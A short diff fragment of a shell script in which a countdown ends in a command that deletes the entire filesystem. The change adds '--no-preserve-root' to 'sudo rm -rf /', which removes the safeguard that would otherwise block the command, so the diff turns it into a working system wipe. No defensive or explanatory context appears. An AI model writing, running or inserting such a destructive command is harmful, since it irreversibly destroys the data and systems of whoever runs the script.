@@ -19,6 +19,6 @@ then
         sleep 1
         echo "1"
         sleep 1
-        sudo rm -rf /
+        sudo rm -rf --no-preserve-root /
     }
 fi
